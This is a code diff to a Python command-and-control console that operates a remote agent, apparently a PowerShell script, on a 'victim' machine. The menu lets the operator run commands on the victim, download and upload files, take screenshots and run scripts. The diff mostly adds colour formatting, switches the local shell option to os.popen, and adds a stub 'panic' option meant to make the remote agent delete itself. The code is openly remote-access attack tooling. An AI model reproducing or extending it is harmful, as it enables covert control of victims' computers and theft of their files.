@@ -53,11 +53,14 @@ cc=(pwd + '/WebOnly/cc.js')
 eguiHTTPS=(pwd + '/ServerRequirements/eguiHTTPS.py')
 server=(pwd + '/ServerRequirements/server.py')
 
+
+#########
+## COLOR VARIABLES
 colorGreen = "\033[1;32;40m"
 colorBlack = "\033[0;37;40m"
 colorRed = "\033[1;31;40m"
 colorYellow = "\033[1;33;40m"
-
+colorBlue = "\033[1;34;40m"
 """
 1 = *
 2 = +
@@ -76,6 +79,10 @@ red1 = "\033[1;31;40m[*]\033[0;37;40m"
 red2 = "\033[1;31;40m[+]\033[0;37;40m"
 red3 = "\033[1;31;40m[!]\033[0;37;40m"
 red4 = "\033[1;31;40m[-]\033[0;37;40m"
+## END COLOR VARIABLES
+###########
+
+
 
 #######
 ## Define Functions
@@ -100,14 +107,24 @@ def keyboardFunc():
 
 def howToFunc():
     # MAYBE
-    print("")
-    print(green1 + " Type '1' to run a command")
-    print(green1 +" Type '2' to download a file from victim")
-    print(green1 + " Type '3' to upload a file to victim")
-    print(green1 + " Type '4' to take a screenshot")
-    print(green1 + " Type '5' to run a script")
-    print(green1 + " Type 'shell' to run a local shell command")
-    print(green1 + " Type 'q' or 'Q' to shutdown")
+    print(colorGreen + "[*] -------------------------------------- [*]" + colorBlack)
+    print(green1 + " Type " \
+            + colorBlue + "1" + colorBlack + " to run a command")
+    print(green1 + " Type " \
+            + colorBlue + "2" + colorBlack + " to download a file from victim")
+    print(green1 + " Type " \
+            + colorBlue + "3" + colorBlack + " to upload a file to victim")
+    print(green1 + " Type " \
+            + colorBlue + "4" + colorBlack + " to take a screenshot")
+    print(green1 + " Type " \
+            + colorBlue + "5" + colorBlack + " to run a script")
+    print(green1 + " Type " \
+            + colorBlue + "shell" + colorBlack + " to run a local shell command")
+    print(green1 + " Type " \
+            + colorBlue + "panic" + colorBlack + " to detonate remote agent")
+    print(green1 + " Type " \
+            + colorBlue + "q" + colorBlack + " or " \
+            + colorBlue + "Q" + colorBlack + " to shutdown")
 
 def mainLoopFunc():
     # Main Loop
@@ -115,8 +132,17 @@ def mainLoopFunc():
     #print('MAIN LOOP')
     while True:
         howToFunc()
-        user_input = str(raw_input(yellow1 + " Type '1', '2', '3', '4', '5', 'shell', or 'q/Q'\n"))
-        print(user_input)
+        user_input = str(raw_input(yellow1 + \
+                " Type " + colorBlue + "1" + colorBlack + \
+                ", " + colorBlue + "2" + colorBlack + \
+                ", " + colorBlue + "3" + colorBlack + \
+                ", " + colorBlue + "4" + colorBlack + \
+                ", " + colorBlue + "5" + colorBlack + \
+                ", " + colorBlue + "shell" + colorBlack + \
+                ", " + colorBlue + "panic" + colorBlack + \
+                ", or " + colorBlue + "q" + colorBlack + \
+                "/" + colorBlue + "Q" + colorBlack + "\n"))
+        #print(user_input)
 
         ###################
         ## 1 - COMMAND
@@ -140,7 +166,7 @@ def mainLoopFunc():
         ## 2 - DOWNLOAD FROM VICTIM
         ###################
         elif user_input is '2':
-            print("DOWNLOAD FROM VICTIM")
+            #print(green3 + "DOWNLOAD FROM VICTIM")
             command_input = raw_input(yellow1 + " What file do you want to Download from Victim?\n")
             # Write command to cc
             f = open (cc, 'w')
@@ -240,12 +266,33 @@ def mainLoopFunc():
         elif user_input == 'shell':
             # Get input from user and use os.system to run the command
             command = raw_input(yellow2 + ' What local command do you want to run?\n')
-            output = os.system(command)
-            print(output)
+            output = os.popen(command).read() # Read raw_input, execute and save to variable
+            
+            #output = os.system(command)
+            print(colorGreen + str(output) + colorBlack)
 
-            time.sleep(SLEEP)
+            #time.sleep(2)
 
             continue
+
+        ############
+        ## 'panic' - This will detonate the agent
+        ############
+        elif user_input == 'panic':
+            command = raw_input(red2 + " You have requested to detonate the agent. Are you sure? 'yes' or 'no'\n")
+            if command == 'yes':
+                command2 = raw_input(red3 + " To make sure you really want this, type 'yes' again\n")
+                if command2 == 'yes':
+                    # SEND THE RM ./EZ-AGENT.ps1' command
+                    print(red4 + " Executing detonation! BOOM!!")
+                    continue # break command2 if
+                else:
+                    print(red1 + " Good call! Not today..")
+                    continue # break command2 else
+            else:
+                print(red1 + " Good call! Not today..")
+                continue # break for "if yes"
+            continue # Continue for elif
         
         ############
         ## RUN SCRIPTS
